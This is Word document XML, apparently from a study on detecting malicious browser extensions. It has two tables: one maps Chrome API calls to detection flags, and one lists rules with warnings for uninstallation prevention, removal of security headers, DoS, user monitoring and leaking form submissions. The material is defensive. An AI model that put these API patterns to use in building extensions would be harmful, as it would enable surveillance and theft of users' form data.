              <w:cnfStyle w:val="100000000000" w:firstRow="1" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r w:rsidRPr="00C518F8">
              <w:t>Flags</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C518F8" w:rsidRPr="00C518F8" w14:paraId="77D45E56"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5A5203C5" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00C518F8" w:rsidRDefault="00C518F8" w:rsidP="00C518F8">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C518F8">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>chrome.tabs.onUpdated.addListener or chrome.tabs.onCreated.addListener</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2394" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="17677A87"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br/>
              <w:t>tab_listener</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C518F8" w:rsidRPr="00C518F8" w14:paraId="09FE16E7"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29340C85" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00C518F8" w:rsidRDefault="00C518F8" w:rsidP="00C518F8">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C518F8">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>chrome.webRequest.onBeforeRequest.addListener</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2394" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4CD106C8"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web_listener</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C518F8" w:rsidRPr="00C518F8" w14:paraId="2F5522B6"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73C15323" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00C518F8" w:rsidRDefault="00C518F8" w:rsidP="00C518F8">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C518F8">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>chrome.tabs.remove</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2394" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5A9F60E5"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remove_tab</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C518F8" w:rsidRPr="00C518F8" w14:paraId="3D3FB2E8"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70215AB5" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00C518F8" w:rsidRDefault="00C518F8" w:rsidP="00C518F8">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C518F8">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>chrome.webRequest.onHeadersReceived.addListener</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2394" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4AA1D39B"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http_header</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C518F8" w:rsidRPr="00C518F8" w14:paraId="70291D09"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4FBF40B4" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00C518F8" w:rsidRDefault="00C518F8" w:rsidP="00C518F8">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C518F8">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>responseHeaders.splice</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2394" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="77220BBC"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remove_security</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C518F8" w:rsidRPr="00C518F8" w14:paraId="6B7E51B1"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744BD847" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00C518F8" w:rsidRDefault="00C518F8" w:rsidP="00C518F8">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C518F8">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>chrome.webstore.install</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2394" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1CB51F4B"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install_extension</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C518F8" w:rsidRPr="00C518F8" w14:paraId="7CCAD70F"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6810DE25" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00C518F8" w:rsidRDefault="00C518F8" w:rsidP="00C518F8">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C518F8">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>chrome.management.uninstall</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2394" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6A27328A"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uninstall_extension</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C518F8" w:rsidRPr="00C518F8" w14:paraId="5DFA31B4"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0CA94F1E" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00C518F8" w:rsidRDefault="00C518F8" w:rsidP="00C518F8">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C518F8">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>chrome.tabs.query</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2394" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="564CDE54"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DoS</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C518F8" w:rsidRPr="00C518F8" w14:paraId="72561D62"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6251A386" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00C518F8" w:rsidRDefault="00C518F8" w:rsidP="00C518F8">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C518F8">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>chrome.system.cpu</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2394" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="70FB436A"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cpu</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C518F8" w:rsidRPr="00C518F8" w14:paraId="178F6959"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6CB23DBF" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00C518F8" w:rsidRDefault="00C518F8" w:rsidP="00C518F8">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C518F8">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>chrome.system.display</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2394" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0CF7C00D"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displays</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C518F8" w:rsidRPr="00C518F8" w14:paraId="7E603B2F"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73C93EC4" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00C518F8" w:rsidRDefault="00C518F8" w:rsidP="00C518F8">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C518F8">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>chrome.sessions.getDevices</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2394" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0A79D154"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sessions</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C518F8" w:rsidRPr="00C518F8" w14:paraId="6D1609A8"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4CCB78B4" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00C518F8" w:rsidRDefault="00C518F8" w:rsidP="00C518F8">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C518F8">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>XMLHttpRequest</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2394" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="34E26A55"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XMLHttpRequest</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C518F8" w:rsidRPr="00C518F8" w14:paraId="23AB5E50"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017D5684" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00C518F8" w:rsidRDefault="00C518F8" w:rsidP="00C518F8">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C518F8">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>XMLHttpRequest.send</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2394" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="406CA965"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send</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C518F8" w:rsidRPr="00C518F8" w14:paraId="0A1433D0"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004DE11B" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00C518F8" w:rsidRDefault="00C518F8" w:rsidP="00C518F8">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C518F8">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>document.forms</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2394" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="46C18B92"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forms</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C518F8" w:rsidRPr="00C518F8" w14:paraId="3FE72F94"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44147746" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00C518F8" w:rsidRDefault="00C518F8" w:rsidP="00C518F8">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C518F8">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>["blocking"]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2394" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6030818F"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block</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C518F8" w:rsidRPr="00C518F8" w14:paraId="4FD9E0BE"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2319186F" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00C518F8" w:rsidRDefault="00C518F8" w:rsidP="00C518F8">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C518F8">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>redirectUrl</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2394" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="14CB21BC"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redirect</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C518F8" w:rsidRPr="00C518F8" w14:paraId="07E7D65E"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748FC2BF" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00C518F8" w:rsidRDefault="00C518F8" w:rsidP="00C518F8">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C518F8">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>cancel</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2394" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4A2EFE8A" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00C518F8" w:rsidRDefault="00C518F8" w:rsidP="00605C1C">
            <w:pPr>
              <w:keepNext/>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cancel</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="64178CA4" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRDefault="00C518F8" w:rsidP="00F5383F"/>
    <w:p w14:paraId="767B6E21" w14:textId="06B790A7" w:rsidR="00C518F8" w:rsidRDefault="00C518F8" w:rsidP="00C518F8">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B350B0B" w14:textId="4CF57D90" w:rsidR="00D451F2" w:rsidRDefault="00D451F2" w:rsidP="00C518F8">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00DECB9E" w14:textId="1FDAB3C1" w:rsidR="00D451F2" w:rsidRDefault="00D451F2" w:rsidP="00C518F8">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="242EA3BE" w14:textId="625D8CD8" w:rsidR="00D451F2" w:rsidRDefault="00D451F2" w:rsidP="00C518F8">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39F118F4" w14:textId="77777777" w:rsidR="00D451F2" w:rsidRPr="00A4250E" w:rsidRDefault="00D451F2" w:rsidP="00C518F8">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="783CE02C" w14:textId="547CE265" w:rsidR="00F5383F" w:rsidRPr="00501982" w:rsidRDefault="00F5383F" w:rsidP="00F5383F">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="209" w:name="_Toc523071592"/>
      <w:r w:rsidRPr="00F5383F">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Table </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="00F5383F">
        <w:instrText xml:space="preserve"> SEQ Table \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="006A6E3D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: List of rules with their description, flags used and </w:t>
      </w:r>
      <w:r w:rsidR="00392CE1">
        <w:t>warning message.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="209"/>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="GridTable1Light1"/>
        <w:tblW w:w="9576" w:type="dxa"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2820"/>
        <w:gridCol w:w="3795"/>
        <w:gridCol w:w="2961"/>
      </w:tblGrid>
      <w:tr w:rsidR="00C518F8" w:rsidRPr="00605C1C" w14:paraId="2B25FB1D" w14:textId="77777777" w:rsidTr="00F5383F">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820" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5270DF4F" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00800A4F" w:rsidRDefault="00800A4F" w:rsidP="00605C1C">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3795" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4F33C61F" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="009B31D0" w:rsidRDefault="009B31D0" w:rsidP="00605C1C">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="100000000000" w:firstRow="1" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Flags</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2961" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="104466BC" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00B046E7" w:rsidRDefault="00B046E7" w:rsidP="00605C1C">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="100000000000" w:firstRow="1" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Warning Message</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C518F8" w:rsidRPr="00605C1C" w14:paraId="648EB6E5"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6B1F3F94" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00605C1C" w:rsidRDefault="00C518F8" w:rsidP="00605C1C">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00605C1C">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>Uninstallation prevention</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3795" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="28D70BE0"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tab_listener and remove_tab and extension_tab</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2961" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5CEF54A2"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Extension tab blocked.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C518F8" w:rsidRPr="00605C1C" w14:paraId="6E5868DD"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520B6C8C" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00605C1C" w:rsidRDefault="00C518F8" w:rsidP="00605C1C">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00605C1C">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>HTTP response header security options</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3795" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1B500C48"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http_header and remove_security and security_option</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2961" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="68F3DC54"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Security options are changed.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C518F8" w:rsidRPr="00605C1C" w14:paraId="45B33A81"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50BBEB22" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00605C1C" w:rsidRDefault="00C518F8" w:rsidP="00605C1C">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00605C1C">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>Extension installation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3795" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="54385323"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install_extension</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2961" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0FDA531D"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Extension installation.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C518F8" w:rsidRPr="00605C1C" w14:paraId="61DB4A0B"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07D83ED5" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00605C1C" w:rsidRDefault="00C518F8" w:rsidP="00605C1C">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00605C1C">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>Extension uninstallation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3795" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0DEF2E4D"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uninstall_extension</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2961" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2BCFE6F0"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Extension uninstallation.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C518F8" w:rsidRPr="00605C1C" w14:paraId="141D2519"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34B4856D" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00605C1C" w:rsidRDefault="00C518F8" w:rsidP="00605C1C">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00605C1C">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>DoS</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3795" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0C6F82FD"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DoS and remove_tab</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2961" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2D00D5F7"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DoS detected.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C518F8" w:rsidRPr="009A14F1" w14:paraId="4E03186F"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3D24E4AF" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00605C1C" w:rsidRDefault="00C518F8" w:rsidP="00605C1C">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00605C1C">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>User's CPU info</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3795" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4B65D4AE"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cpu</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2961" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1C9CFF83"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User's info monitoring detected (cpu).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C518F8" w:rsidRPr="009A14F1" w14:paraId="549B1AFB"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67CD3DFA" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00605C1C" w:rsidRDefault="00C518F8" w:rsidP="00605C1C">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00605C1C">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>User's number of displays</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3795" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="47CF8FFD"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displays</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2961" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="00D3B388"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User's info monitoring detected (displays).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C518F8" w:rsidRPr="009A14F1" w14:paraId="50F9310C"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5D670053" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00605C1C" w:rsidRDefault="00C518F8" w:rsidP="00605C1C">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00605C1C">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>User's sessions info</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3795" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="53846018"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sessions</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2961" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="186760CC"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User's info monitoring detected (sessions).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C518F8" w:rsidRPr="00605C1C" w14:paraId="7DBC269D"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02DB8962" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00605C1C" w:rsidRDefault="00C518F8" w:rsidP="00605C1C">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00605C1C">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>Form submit requests</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3795" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3B3216EB"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forms and XMLHttpRequest and send</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2961" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0BA6168F"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Form submit requests leak.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
